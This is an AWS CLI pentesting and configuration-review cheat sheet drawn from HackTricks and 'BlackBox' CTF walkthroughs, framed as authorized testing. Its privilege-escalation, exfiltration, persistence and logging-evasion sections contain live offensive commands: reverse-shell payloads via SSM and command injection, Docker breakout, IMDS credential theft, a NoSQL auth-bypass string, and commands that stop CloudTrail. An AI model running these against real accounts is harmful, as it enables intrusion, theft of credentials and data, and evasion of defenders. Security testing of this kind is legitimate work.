# AWS CLI Pentesting & Configuration Review Cheat Sheet

This cheat sheet provides a structured approach to manually pentesting and reviewing the configuration of an AWS environment using the AWS Command Line Interface (CLI). It assumes you have been provided with CLI credentials. This guide is inspired by methodologies and techniques found on [cloud.hacktricks.xyz](https://cloud.hacktricks.xyz/) and incorporates insights from common AWS red teaming practices.

**Disclaimer:** Always ensure you have explicit, written permission from the account owner before conducting any security testing. Unauthorized access or testing can have legal consequences.

## Table of Contents

1.  [Initial Setup & Credential Verification](#initial-setup--credential-verification)
2.  [Phase 1: Reconnaissance & Initial Enumeration](#phase-1-reconnaissance--initial-enumeration)
    * [Understanding Current Identity and Permissions](#understanding-current-identity-and-permissions)
    * [Global Service Enumeration](#global-service-enumeration)
    * [Regional Service Enumeration (Iterate per region)](#regional-service-enumeration-iterate-per-region)
3.  [Phase 2: Service-Specific Enumeration & Exploitation](#phase-2-service-specific-enumeration--exploitation)
    * [IAM (Identity and Access Management)](#iam-identity-and-access-management)
    * [S3 (Simple Storage Service)](#s3-simple-storage-service)
    * [EC2 (Elastic Compute Cloud) & Related Services (IMDS, SSM)](#ec2-elastic-compute-cloud--related-services-imds-ssm)
    * [DynamoDB](#dynamodb)
    * [Lambda & Lambda Layers](#lambda--lambda-layers)
    * [Secrets Manager & Parameter Store](#secrets-manager--parameter-store)
    * [ECS (Elastic Container Service) & ECR (Elastic Container Registry)](#ecs-elastic-container-service--ecr-elastic-container-registry)
    * [CloudFormation](#cloudformation)
    * [Other Notable Services](#other-notable-services)
4.  [Phase 3: Privilege Escalation](#phase-3-privilege-escalation)
5.  [Phase 4: Lateral Movement](#phase-4-lateral-movement)
6.  [Phase 5: Data Exfiltration](#phase-5-data-exfiltration)
7.  [Phase 6: Persistence](#phase-6-persistence)
8.  [Phase 7: Logging & Monitoring Evasion/Detection](#phase-7-logging--monitoring-evasiondetection)
9.  [Phase 8: Post-Exploitation on Compromised Resources](#phase-8-post-exploitation-on-compromised-resources)
10. [Phase 9: Reporting & Cleanup](#phase-9-reporting--cleanup)
11. [Configuration Review Focus Areas](#configuration-review-focus-areas)

---

## Initial Setup & Credential Verification

* **Configure AWS CLI Profile:**
    Create or modify `~/.aws/credentials` (Linux/macOS) or `%USERPROFILE%\.aws\credentials` (Windows):
    ```ini
    [profile_name]
    aws_access_key_id = YOUR_ACCESS_KEY
    aws_secret_access_key = YOUR_SECRET_KEY
    aws_session_token = YOUR_SESSION_TOKEN (if using temporary credentials)
    region = YOUR_REGION (e.g., us-east-1)
    ```
    Alternatively, use `aws configure --profile <profile_name>`.
* **Verify Credentials and Get Account ID:**
    ```bash
    aws sts get-caller-identity --profile <profile_name>
    # Note the Account, UserId, and Arn.
    ```
* **Store Account ID in Environment Variable (optional, for convenience):**
    ```bash
    export ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text --profile <profile_name>)
    ```
* **List Available Regions (useful for iterating commands):**
    ```bash
    aws ec2 describe-regions --profile <profile_name> --query "Regions[].RegionName" --output text
    ```

---

## Phase 1: Reconnaissance & Initial Enumeration

### Understanding Current Identity and Permissions

* **Get Caller Identity:** (Already done above, but crucial first step)
    ```bash
    aws sts get-caller-identity --profile <profile_name>
    ```
* **Get Account Alias:**
    ```bash
    aws iam list-account-aliases --profile <profile_name>
    ```
* **List Attached User Policies (for the current user):**
    ```bash
    # Assuming UserName is derived from get-caller-identity ARN
    export UserName=$(aws sts get-caller-identity --query "Arn" --output text --profile <profile_name> | cut -d '/' -f2)
    aws iam list-attached-user-policies --user-name $UserName --profile <profile_name>
    ```
* **Get User Policies (inline):**
    ```bash
    aws iam list-user-policies --user-name $UserName --profile <profile_name>
    aws iam get-user-policy --user-name $UserName --policy-name <policy_name> --profile <profile_name>
    ```
* **Get Details of a Specific Attached Policy:**
    First, get the Policy ARN:
    ```bash
    export UserPolicyARN=$(aws iam list-attached-user-policies --user-name $UserName --profile <profile_name> --query "AttachedPolicies[?PolicyName=='<policy_name>'].PolicyArn" --output text)
    ```
    Then, get the policy document (often version `v1`, check `list-policy-versions` if unsure):
    ```bash
    aws iam get-policy-version --policy-arn $UserPolicyARN --version-id <version_id> --profile <profile_name>
    aws iam list-policy-versions --policy-arn $UserPolicyARN --profile <profile_name>
    ```
* **Check for Permissions Boundary:**
    ```bash
    aws iam get-user --user-name $UserName --profile <profile_name> --query "User.PermissionsBoundary"
    # If a boundary exists, it restricts the maximum permissions the user can have.
    ```
* **Simulate Principal Policy (to check permissions for specific actions):**
    ```bash
    aws iam simulate-principal-policy --policy-source-arn <current_user_arn> --action-names "s3:ListBuckets" "ec2:DescribeInstances" "secretsmanager:GetSecretValue" --profile <profile_name>
    ```
    Tools like `bf-aws-permissions.sh` (mentioned in "BlackBox III") or custom scripts can automate checking many permissions.

### Global Service Enumeration

* **IAM Users, Groups, Roles, Policies:**
    ```bash
    aws iam list-users --profile <profile_name>
    aws iam list-groups --profile <profile_name>
    aws iam list-roles --profile <profile_name>
    aws iam list-policies --scope Local --profile <profile_name> # Customer Managed Policies
    aws iam list-policies --scope AWS --profile <profile_name> # AWS Managed Policies
    ```
* **S3 Buckets:**
    ```bash
    aws s3 ls --profile <profile_name> # [--no-sign-request if testing for public buckets from any creds]
    ```
* **Route53 Hosted Zones:**
    ```bash
    aws route53 list-hosted-zones --profile <profile_name>
    ```
* **CloudFront Distributions:**
    ```bash
    aws cloudfront list-distributions --profile <profile_name>
    ```
* **Certificate Manager (ACM - mainly us-east-1 for CloudFront, but check other regions):**
    ```bash
    aws acm list-certificates --profile <profile_name> --region <region>
    ```

### Regional Service Enumeration (Iterate per region)

*For each relevant region:*

* **EC2 Instances:**
    ```bash
    aws ec2 describe-instances --profile <profile_name> --region <region> --query "Reservations[*].Instances[*].[InstanceId,InstanceType,State.Name,PublicIpAddress,PrivateIpAddress,KeyName,Placement.AvailabilityZone,LaunchTime,Tags[?Key=='Name'].Value|[0]]" --output table
    ```
* **EC2 Security Groups:**
    ```bash
    aws ec2 describe-security-groups --profile <profile_name> --region <region>
    ```
* **EBS Volumes & Snapshots:**
    ```bash
    aws ec2 describe-volumes --profile <profile_name> --region <region>
    aws ec2 describe-snapshots --owner-ids self $ACCOUNT_ID --profile <profile_name> --region <region>
    ```
* **RDS Instances & Snapshots:**
    ```bash
    aws rds describe-db-instances --profile <profile_name> --region <region>
    aws rds describe-db-snapshots --profile <profile_name> --region <region>
    ```
* **Lambda Functions & Layers:**
    ```bash
    aws lambda list-functions --profile <profile_name> --region <region>
    aws lambda list-layers --profile <profile_name> --region <region>
    ```
* **API Gateway APIs (v1 & v2):**
    ```bash
    aws apigateway get-rest-apis --profile <profile_name> --region <region>
    # For each v1 API ID:
    aws apigateway get-resources --rest-api-id <api_id> --profile <profile_name> --region <region>
    aws apigateway get-stages --rest-api-id <api_id> --profile <profile_name> --region <region>
    # Note authorizers, API keys, and integration points.
    aws apigatewayv2 get-apis --profile <profile_name> --region <region>
    ```
* **Elastic Load Balancers (Classic, Application, Network):**
    ```bash
    aws elb describe-load-balancers --profile <profile_name> --region <region>
    aws elbv2 describe-load-balancers --profile <profile_name> --region <region>
    ```
* **ECS Clusters, Services & Task Definitions:**
    ```bash
    aws ecs list-clusters --profile <profile_name> --region <region>
    aws ecs list-services --cluster <cluster_name> --profile <profile_name> --region <region>
    aws ecs list-task-definitions --profile <profile_name> --region <region>
    aws ecs describe-task-definition --task-definition <task_definition_arn_or_family:revision> --profile <profile_name> --region <region>
    ```
* **EKS Clusters:**
    ```bash
    aws eks list-clusters --profile <profile_name> --region <region>
    ```
* **SQS Queues & SNS Topics:**
    ```bash
    aws sqs list-queues --profile <profile_name> --region <region>
    aws sns list-topics --profile <profile_name> --region <region>
    ```
* **Secrets Manager & Parameter Store:**
    ```bash
    aws secretsmanager list-secrets --profile <profile_name> --region <region>
    aws ssm describe-parameters --profile <profile_name> --region <region>
    ```
* **Systems Manager Documents:**
    ```bash
    aws ssm list-documents --profile <profile_name> --region <region>
    aws ssm get-document --name <document_name> --profile <profile_name> --region <region> --query "Content" --output text
    ```
* **CloudFormation Stacks:**
    ```bash
    aws cloudformation list-stacks --profile <profile_name> --region <region>
    ```
* **CloudTrail Trails:**
    ```bash
    aws cloudtrail describe-trails --profile <profile_name> --region <region>
    ```
* **VPCs, Subnets, Route Tables, VPC Endpoints:**
    ```bash
    aws ec2 describe-vpcs --profile <profile_name> --region <region>
    aws ec2 describe-subnets --profile <profile_name> --region <region>
    aws ec2 describe-route-tables --profile <profile_name> --region <region>
    aws ec2 describe-vpc-endpoints --profile <profile_name> --region <region>
    ```
* **ECR Repositories:**
    ```bash
    aws ecr describe-repositories --profile <profile_name> --region <region>
    ```

---

## Phase 2: Service-Specific Enumeration & Exploitation

### IAM (Identity and Access Management)

* **Review Policies for Excessive Permissions:**
    * Look for `"*"` in `Action` or `Resource`.
    * Identify risky permissions like `iam:PassRole`, `iam:CreatePolicyVersion`, `iam:PutUserPolicy`, `iam:AttachUserPolicy`, `sts:AssumeRole`, `iam:UpdateAssumeRolePolicy`.
    * Get policy details:
        ```bash
        aws iam get-policy --policy-arn <policy_arn> --profile <profile_name>
        aws iam get-policy-version --policy-arn <policy_arn> --version-id <version_id> --profile <profile_name>
        ```
* **Check User Login Profiles (Console Access):**
    ```bash
    aws iam get-login-profile --user-name <user_name> --profile <profile_name> # (Will error if none)
    ```
* **List Access Keys for Users (if permissions allow):**
    ```bash
    aws iam list-access-keys --user-name <user_name> --profile <profile_name>
    ```
* **Check Role Trust Relationships (for `sts:AssumeRole` or potential `iam:UpdateAssumeRolePolicy`):**
    ```bash
    aws iam get-role --role-name <role_name> --profile <profile_name> --query "Role.AssumeRolePolicyDocument"
    # Look for overly permissive principals or principals you might control/influence.
    ```

### S3 (Simple Storage Service)

* **List Bucket Contents:**
    ```bash
    aws s3 ls s3://<bucket_name>/ --recursive --profile <profile_name> # [--no-sign-request if applicable]
    # Check for interesting files like "credentials.txt"
    ```
* **Check Bucket ACLs:**
    ```bash
    aws s3api get-bucket-acl --bucket <bucket_name> --profile <profile_name> # [--no-sign-request]
    # Look for "AllUsers" or "AuthenticatedUsers" grants, or specific CanonicalUser grants.
    ```
* **Check Object ACLs:**
    ```bash
    aws s3api get-object-acl --bucket <bucket_name> --key <object_key> --profile <profile_name> # [--no-sign-request]
    ```
* **Check Bucket Policies:**
    ```bash
    aws s3api get-bucket-policy --bucket <bucket_name> --profile <profile_name> # [--no-sign-request]
    # Look for permissive statements, especially with "AWS": "*" principals.
    ```
* **Check Bucket CORS Configuration:**
    ```bash
    aws s3api get-bucket-cors --bucket <bucket_name> --profile <profile_name>
    ```
* **Attempt to Read/Write Objects:**
    ```bash
    aws s3 cp s3://<bucket_name>/<object_key> . --profile <profile_name> # [--no-sign-request]
    echo "test" > test.txt && aws s3 cp test.txt s3://<bucket_name>/test.txt --profile <profile_name> # [--no-sign-request]
    # If PutObject is denied but PutObjectAcl is allowed, you might be able to change ACLs to gain read.
    ```
* **Check Bucket Versioning & Website Configurations:**
    ```bash
    aws s3api get-bucket-versioning --bucket <bucket_name> --profile <profile_name>
    aws s3api get-bucket-website --bucket <bucket_name> --profile <profile_name>
    ```

### EC2 (Elastic Compute Cloud) & Related Services (IMDS, SSM)

* **Review Security Group Rules:**
    ```bash
    aws ec2 describe-security-groups --group-ids <sg_id> --profile <profile_name> --region <region>
    # Look for overly permissive inbound rules (e.g., 0.0.0.0/0 for SSH, RDP), or internal rules that allow access from unexpected sources.
    ```
* **Check EC2 Instance Metadata Service (IMDS) if you gain shell access or via SSRF:**
    * **IMDSv1 (if available):**
        ```bash
        # From within the EC2 instance or via SSRF
        curl [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)
        curl [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)<role_name>
        ```
    * **IMDSv2 (requires token, instance might be configured for "HttpTokens": "required"):**
        ```bash
        # From within the EC2 instance or via SSRF that supports PUT for token and subsequent GET with header
        TOKEN=$(curl -X PUT "[http://169.254.169.254/latest/api/token](http://169.254.169.254/latest/api/token)" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
        curl -H "X-aws-ec2-metadata-token: $TOKEN" [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/) 2>/dev/null
        curl -H "X-aws-ec2-metadata-token: $TOKEN" [http://169.254.169.254/latest/meta-data/iam/security-credentials/](http://169.254.169.254/latest/meta-data/iam/security-credentials/)<role_name> 2>/dev/null
        ```
        The SSRF in "BlackBox III" abuses `/config?path=http://localhost/info?url=` to reach IMDS. The calculator page vulnerability allows RCE to fetch IMDSv2 token and credentials.
* **Examine User Data:**
    ```bash
    aws ec2 describe-instance-attribute --instance-id <instance_id> --attribute userData --profile <profile_name> --region <region> --query "UserData.Value" --output text | base64 --decode
    # Look for hardcoded secrets, scripts pulling from insecure S3 buckets.
    ```
* **SSM (Systems Manager):**
    * Check managed instances:
        ```bash
        aws ssm describe-instance-information --profile <profile_name> --region <region>
        ```
    * Check for `ssm:SendCommand` permission, which can grant shell access.
        ```bash
        # Example of getting a reverse shell if permissions allow
        # Ensure nc listener and ngrok (or similar) are set up
        aws ssm send-command --instance-ids "<instance_id>" \
          --document-name "AWS-RunShellScript" --output text \
          --parameters commands="bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1" \
          --profile <profile_name> --region <region>
        # The BlackBox III example uses a curl to a reverse shell script
        ```

### DynamoDB

* **List Tables:**
    ```bash
    aws dynamodb list-tables --profile <profile_name> --region <region>
    ```
* **Scan Table for Data (especially for flags or sensitive info):**
    ```bash
    aws dynamodb scan --table-name <table_name> --profile <profile_name> --region <region>
    # Be cautious with large tables. Use --max-items and --starting-token for pagination if needed.
    ```
* **DynamoDB Injection (if web application directly uses input in ScanFilter):**
    The "BlackBox III" walkthrough shows a NoSQL injection in the `ScanFilter` parameter of a `dynamodb.scan` operation to bypass authentication.
    Original query structure:
    `{ "username": { "ComparisonOperator": "EQ", "AttributeValueList": [{"S": "user"}]}, "password": { "ComparisonOperator": "EQ", "AttributeValueList": [{"S": "pass"}]} }`
    Injection in username (and similarly in password): `none"}], "ComparisonOperator": "NE", "AttributeValueList": [{"S":"none`. This changes the logic to effectively `username != "none" AND password != "none"`.

### Lambda & Lambda Layers

* **Get Function Configuration & Environment Variables:**
    ```bash
    aws lambda list-functions --profile <profile_name> --region <region>
    aws lambda get-function-configuration --function-name <function_name> --profile <profile_name> --region <region>
    # Review environment variables for secrets (e.g., PASSWORD, HINT, ID, KEY). Base64 decode if necessary.
    ```
* **Get Function Policy (resource-based policy):**
    ```bash
    aws lambda get-policy --function-name <function_name> --profile <profile_name> --region <region>
    # Check who can invoke or manage the function.
    ```
* **Download Function Code:**
    ```bash
    aws lambda get-function --function-name <function_name> --query 'Code.Location' --profile <profile_name> --region <region> --output text
    # Use the pre-signed URL from the output (e.g., with curl) to download the zip. Inspect code.
    ```
* **Review Execution Role Permissions:** The role ARN is in `get-function-configuration` output. Analyze this role's permissions.
* **Check Lambda Layers and Versions:**
    ```bash
    aws lambda list-layers --profile <profile_name> --region <region>
    aws lambda list-layer-versions --layer-name <layer_name> --profile <profile_name> --region <region>
    aws lambda get-layer-version --layer-name <layer_name> --version-number <version> --profile <profile_name> --query Content.Location --output text
    # Use the pre-signed URL to download and inspect layer code.
    ```

### Secrets Manager & Parameter Store

* **List Secrets (Secrets Manager):**
    ```bash
    aws secretsmanager list-secrets --profile <profile_name> --region <region>
    ```
* **Get Secret Value (Secrets Manager - if permissions allow):**
    ```bash
    aws secretsmanager get-secret-value --secret-id <secret_arn_or_name> --profile <profile_name> --region <region>
    ```
* **Describe Parameters (Parameter Store):**
    ```bash
    aws ssm describe-parameters --profile <profile_name> --region <region>
    ```
* **Get Parameter Value(s) (Parameter Store - if permissions allow):**
    ```bash
    aws ssm get-parameter --name <parameter_name> --with-decryption --profile <profile_name> --region <region>
    aws ssm get-parameters --names "param1" "param2" --with-decryption --profile <profile_name> --region <region>
    aws ssm get-parameters-by-path --path "/path/prefix/" --recursive --with-decryption --profile <profile_name> --region <region>
    ```

### ECS (Elastic Container Service) & ECR (Elastic Container Registry)

* **Command Injection to Reverse Shell (from "BlackBox II"):**
    If a web application running in a container is vulnerable to command injection (`example.com; <command>`), attempt to get a reverse shell.
    ```bash
    # Setup ngrok and netcat listener
    # Payload: example.com; nc <ngrok_ip> <ngrok_port> -e /bin/sh
    # Or using python: example.com; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ngrok_ip>",<ngrok_port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    ```
* **Docker Breakout (from "BlackBox II"):**
    If you get a shell in a container and the Docker socket is mounted (`/host/run/docker.sock`):
    1.  List host Docker images: `docker -H unix:///host/run/docker.sock images`.
    2.  Run a privileged container mounting the host's root:
        `docker -H unix:///host/run/docker.sock run -it --privileged -v /:/host <image_id_or_name> chroot /host sh`.
* **Accessing ECS Task Role Credentials from Host/Another Container:**
    After Docker escape or if on the host, list running containers: `docker -H unix:///run/docker.sock ps`.
    Exec into a target container: `docker -H unix:///run/docker.sock exec -it <container_id> /bin/bash`.
    Inside the container, retrieve credentials using the ECS metadata endpoint and `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` environment variable:
    ```bash
    curl [http://169.254.170.2](http://169.254.170.2)$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
    ```
* **ECR (Elastic Container Registry):**
    * List repositories and images, check for vulnerabilities if tools are available.
        ```bash
        aws ecr describe-repositories --profile <profile_name> --region <region>
        aws ecr list-images --repository-name <repo_name> --profile <profile_name> --region <region>
        ```

### CloudFormation

* **Review Stack Templates & Outputs:**
    ```bash
    aws cloudformation get-template --stack-name <stack_name> --profile <profile_name> --region <region>
    aws cloudformation describe-stack-resources --stack-name <stack_name> --profile <profile_name> --region <region>
    aws cloudformation describe-stacks --stack-name <stack_name> --profile <profile_name> --region <region> --query "Stacks[0].Outputs"
    # Look for hardcoded secrets, insecure resource configurations, or sensitive info in outputs.
    ```

### Other Notable Services

* **CodeCommit, CodeBuild, CodeDeploy, CodePipeline:**
    * Look for source code, build artifacts, deployment configurations.
    * Example: `aws codecommit list-repositories --profile <profile_name> --region <region>`
* **Elasticsearch/OpenSearch:**
    * Check for public access, authentication/authorization.
        ```bash
        aws es describe-elasticsearch-domains --profile <profile_name> --region <region>
        # aws opensearch describe-domains --profile <profile_name> --region <region> (for OpenSearch)
        ```

---

## Phase 3: Privilege Escalation

* **Exploit IAM Misconfigurations:**
    * `iam:CreatePolicyVersion`: Create a new version of an existing policy attached to a privileged user/role, granting yourself more permissions.
        ```bash
        # 1. Get current policy document
        # 2. Modify it to add malicious permissions
        # 3. Create new policy version
        aws iam create-policy-version --policy-arn <policy_arn> --policy-document file://new_policy.json --set-as-default --profile <profile_name>
        ```
    * `iam:SetDefaultPolicyVersion`: Change the default version of a policy to a more permissive (potentially older and less secure) version.
    * `iam:PutUserPolicy`, `iam:PutRolePolicy`, `iam:PutGroupPolicy`: Attach a new inline policy.
    * `iam:AttachUserPolicy`, `iam:AttachRolePolicy`, `iam:AttachGroupPolicy`: Attach an existing managed policy. (As seen in "arte_IAM_2_AttachUserPolicy.pdf")
        ```bash
        aws iam attach-user-policy --user-name $UserName --policy-arn $TargetPolicyARN --profile <profile_name>
        ```
    * `iam:UpdateAssumeRolePolicy`: If you have permission to update the trust policy of a role, you can allow your user (or another controlled principal) to assume it.
        ```bash
        # 1. Get existing trust policy
        aws iam get-role --role-name <role_name> --query Role.AssumeRolePolicyDocument --output json > current_trust.json
        # 2. Modify current_trust.json to add your principal (e.g., "AWS": "arn:aws:iam::ACCOUNT_ID:user/YourUser")
        # 3. Update the policy
        aws iam update-assume-role-policy --role-name <role_name> --policy-document file://modified_trust.json --profile <profile_name>
        ```
    * `iam:PassRole` + Service that can use the role (e.g., `ec2:RunInstances` with a role that has admin privileges, `lambda:CreateFunction` with a role).
    * `sts:AssumeRole`: If you can assume a role with higher privileges.
        ```bash
        aws sts assume-role --role-arn <role_to_assume_arn> --role-session-name <session_name> --profile <current_profile_name>
        # Then configure a new profile with these temporary credentials.
        ```
* **IAM `iam:PutObjectAcl` on S3 to Read Sensitive Files ("BlackBox I"):**
    If a bucket policy allows `AWS: *` principal to `s3:PutObjectAcl` and `s3:GetObjectAcl` on objects (`*`), but `s3:GetObject` is denied for you initially:
    1.  Identify the target object (e.g., `credentials.txt`).
    2.  Create an ACL JSON file granting `AllUsers` `FULL_CONTROL` (or `READ`):
        ```json
        // acl_policy.json
        {
          "Owner": {
            "DisplayName": "<bucket_owner_display_name>", // Get from get-bucket-acl
            "ID": "<bucket_owner_canonical_id>" // Get from get-bucket-acl
          },
          "Grants": [
            {
              "Grantee": {
                "URI": "[http://acs.amazonaws.com/groups/global/AllUsers](http://acs.amazonaws.com/groups/global/AllUsers)",
                "Type": "Group"
              },
              "Permission": "READ" // Or FULL_CONTROL
            }
          ]
        }
        ```
    3.  Apply the ACL:
        `aws s3api put-object-acl --bucket $BlackBoxBucket --key credentials.txt --access-control-policy file://acl_policy.json --profile <profile_name>`
    4.  Access the object: `curl https://$BlackBoxBucket.s3.amazonaws.com/credentials.txt`.
* **IAM `iam:AddUserToGroup` ("BlackBox I"):**
    If the user has `iam:AddUserToGroup` permission:
    1.  List available groups: `aws iam list-groups --profile <profile_name>`.
    2.  Identify a group with higher privileges.
    3.  Add the current user to that group:
        `aws iam add-user-to-group --group-name <group_name> --user-name <user_name_to_add> --profile <profile_name>`.
* **EC2 Instance Profile Abuse:** If an EC2 instance has an overly permissive instance profile, compromising the EC2 instance gives access to those permissions (via IMDS).
* **Lambda Execution Role Abuse:** Compromising a Lambda or its code could lead to abusing its role.
* **Exploiting Lambda Environment Variables for Credentials ("BlackBox I"):**
    If Lambda functions listable by your user contain credentials (ID, KEY) in environment variables, decode them (e.g., Base64) and configure a new profile with these credentials.
* **SSRF to IMDS to get EC2 Role Credentials ("BlackBox III").**
* **RCE on EC2 to get Instance Role Credentials ("BlackBox III").**

---

## Phase 4: Lateral Movement

* **Using Acquired Credentials:** Credentials obtained via privesc or enumeration (e.g., from EC2 metadata, Secrets Manager, hardcoded in code, Lambda env vars, ECS task roles) can be used to access other services/resources.
* **Network Pivoting:**
    * If an EC2 instance is compromised, it might have network access to other internal instances or services (RDS, ElastiCache) not exposed externally.
    * Security Groups and NACLs dictate network paths.
* **Assume Roles:** Use `sts:AssumeRole` with discovered roles that have trust relationships with your current principal or a compromised principal.
* **Service-to-Service Communication:** Analyze how services are chained together.
* **Pass-the-Role:** If you can start a service (e.g., EC2, Lambda) and specify an IAM role for it to use (`iam:PassRole`), you can potentially make that service perform actions on your behalf using that role's permissions.
* **VPC Peering/Transit Gateway:** Understand cross-VPC communication paths.
* **Pivoting through Private IP ("BlackBox III"):**
    Accessing internal web applications or services on their private IPs from a compromised EC2 instance that has network visibility.
* **Docker Escape and Container Hopping ("BlackBox II"):**
    Escape a container to the host, then access other containers running on the same host.

---

## Phase 5: Data Exfiltration

* **S3 Buckets:**
    * Copying data out: `aws s3 cp s3://<bucket_name>/<path> <local_path_or_other_s3_bucket> --recursive --profile <profile_name>`
    * Making buckets/objects public (if permissions allow).
    * Generating pre-signed URLs: `aws s3 presign s3://<bucket_name>/<object_key> --expires-in <seconds> --profile <profile_name>`
* **RDS Snapshots:** Share snapshots with an external account or make them public.
    ```bash
    aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot_id> --attribute-name restore --values-to-add <external_aws_account_id_or_"all"> --profile <profile_name> --region <region>
    ```
* **EBS Snapshots:** Share or make public.
    ```bash
    aws ec2 modify-snapshot-attribute --snapshot-id <snap_id> --attribute createVolumePermission --operation-type add --user-ids <external_aws_account_id_or_"all"> --profile <profile_name> --region <region>
    ```
* **Database Dumps:** Connect to RDS/databases on EC2 and exfiltrate data.
* **Secrets Manager/Parameter Store:** Retrieve and exfiltrate secrets.
* **Code Exfiltration (Lambda, CodeCommit, EC2 instances).**
* **DNS Exfiltration:** Using DNS queries to exfiltrate small amounts of data from compromised EC2 instances if direct outbound traffic is blocked.
* **CloudTrail Log Exfiltration (if access to the S3 bucket holding them is achieved).**
* **DynamoDB:** Scan tables and exfiltrate data.

---

## Phase 6: Persistence

* **Create New IAM Users/Access Keys:**
    ```bash
    aws iam create-user --user-name <new_user> --profile <profile_name>
    aws iam create-access-key --user-name <new_user> --profile <profile_name>
    aws iam attach-user-policy --user-name <new_user> --policy-arn <admin_or_custom_policy_arn> --profile <profile_name>
    ```
* **Create/Update Login Profiles for IAM Users:**
    ```bash
    aws iam create-login-profile --user-name <user_name> --password <strong_password> --password-reset-required --profile <profile_name>
    ```
* **Add Own Account to Role Trust Policies (via `iam:UpdateAssumeRolePolicy`):**
    As described in Privilege Escalation, modify a role's trust policy.
* **Backdoor EC2 Instances:**
    * Add SSH keys, create cron jobs, install remote access tools.
    * Modify User Data to run scripts on boot (instance needs stop/start):
        ```bash
        # Encode payload to Base64 first
        aws ec2 modify-instance-attribute --instance-id <instance_id> --attribute userData --value file://payload.b64 --profile <profile_name> --region <region>
        ```
* **Backdoor Lambda Functions:**
    * Modify function code to include a backdoor.
    * Add triggers (e.g., CloudWatch scheduled event).
* **Modify Lambda Layers:**
    If you gain permissions to create new versions of Lambda layers (`lambda:PublishLayerVersion`) that are used by existing functions, you could inject malicious code.
    ```bash
    # Requires zipping your new layer code first
    # aws lambda publish-layer-version --layer-name <layer_name> --zip-file fileb://layer.zip --compatible-runtimes python3.9 --profile <profile_name> --region <region>
    ```
* **Create Malicious CloudFormation Stack with persistent resources.**

---

## Phase 7: Logging & Monitoring Evasion/Detection

* **CloudTrail:**
    * Understand what actions are logged (most API calls are).
    * Identify where logs are stored (S3 bucket, CloudWatch Logs).
    * Attempt to stop/delete trails (requires `cloudtrail:StopLogging`, `cloudtrail:DeleteTrail`).
        ```bash
        aws cloudtrail stop-logging --name <trail_arn_or_name> --profile <profile_name> --region <region>
        aws cloudtrail delete-trail --name <trail_arn_or_name> --profile <profile_name> --region <region>
        ```
    * Modify trail settings (e.g., remove global event logging, change S3 bucket).
    * Delete log files from S3 (requires `s3:DeleteObject` on the log bucket).
* **GuardDuty:**
    * Identify if GuardDuty is enabled: `aws guardduty list-detectors --profile <profile_name> --region <region>`
    * Attempt to disable GuardDuty or suppress findings (requires high privileges like `guardduty:StopMonitoringMembers`, `guardduty:DeleteDetector`, `guardduty:UpdateFindingsFeedback`).
* **VPC Flow Logs:** Check if enabled and where they are stored. Deleting logs or stopping flow logs.
* **Using less common regions or regions with no/minimal logging configured.**
* **Using temporary credentials from assumed roles where the assume role event itself might be the only clear indicator if not closely monitored.**
* **Data exfiltration over legitimate, commonly used ports (HTTPS/DNS).**

---

## Phase 8: Post-Exploitation on Compromised Resources

Once shell access is gained on a resource (e.g., EC2 instance, container):

* **Standard System Enumeration:**
    * Check shell history: `history`
    * List environment variables: `env`, `printenv`
    * Look for credentials in common locations:
        * `~/.aws/credentials`, `~/.aws/config`
        * `~/.bash_history`, `~/.zsh_history`
        * Application configuration files (e.g., web server configs, database connection strings).
        * Source code repositories (e.g., `.git/config`, look for hardcoded secrets).
        * Docker environment files or mounted secrets.
    * Check running processes: `ps aux`, `top`
    * Check cron jobs: `crontab -l`, files in `/etc/cron.*`
    * Inspect application logs: `/var/log/`, application-specific directories.
    * Network connections: `netstat -tulnp`, `ss -tulnp`
    * Mounted filesystems: `df -h`, `mount`

---

## Phase 9: Reporting & Cleanup

* **Reporting:** Document all findings, vulnerabilities, exploitation steps, and potential impact. Provide clear recommendations for remediation.
* **Cleanup (Crucial - perform only as agreed with the client):**
    * Remove any created IAM users, roles, policies, access keys.
    * Delete created resources (EC2 instances, S3 buckets/objects, Lambda functions, etc.).
    * Revert any modified policies or configurations to their original state.
    * Ensure no backdoors or persistence mechanisms are left behind.
    * **Verify cleanup thoroughly.**

---

## Configuration Review Focus Areas

Beyond active exploitation, a configuration review involves examining settings for deviations from best practices:

* **IAM:**
    * MFA on root and privileged users.
    * Least privilege for users, groups, and roles.
    * Regular review of IAM policies for excessive permissions.
    * Strong password policies.
    * Regularly rotate access keys.
    * No unused credentials.
    * Use of IAM Roles for EC2 instances and other services instead of hardcoding credentials.
    * Restrict `iam:PassRole` carefully.
* **S3:**
    * Block Public Access settings enabled.
    * No public buckets unless explicitly intended and secured.
    * Bucket policies and ACLs adhere to least privilege.
    * Server-side encryption enabled.
    * Logging and versioning enabled.
* **Networking (VPC, Security Groups, NACLs):**
    * Security Groups only allow necessary traffic (least privilege).
    * No overly permissive inbound rules (e.g., 0.0.0.0/0 to management ports).
    * NACLs provide a stateless layer of defense.
    * VPC Flow Logs enabled for critical VPCs.
    * Use of VPC Endpoints for private communication with AWS services.
* **Logging and Monitoring:**
    * CloudTrail enabled in all regions, logging to a central, secure S3 bucket.
    * Log file integrity validation enabled for CloudTrail.
    * GuardDuty enabled in all relevant regions.
    * AWS Config enabled for resource change tracking and compliance.
    * CloudWatch Alarms for critical events (e.g., root login, IAM policy changes, console sign-in failures).
* **Data Protection:**
    * Encryption at rest (EBS, RDS, S3, etc.) and in transit.
    * Secrets managed in Secrets Manager or Parameter Store, not hardcoded.
    * Regular backups and tested recovery procedures.
* **EC2:**
    * Use of IMDSv2 enforced where possible.
    * Patch management in place.
    * Security groups appropriately scoped.
* **RDS:**
    * Not publicly accessible unless necessary.
    * Encryption at rest enabled.
    * Strong credentials.
    * Security groups appropriately scoped.
* **Lambda:**
    * Execution roles follow least privilege.
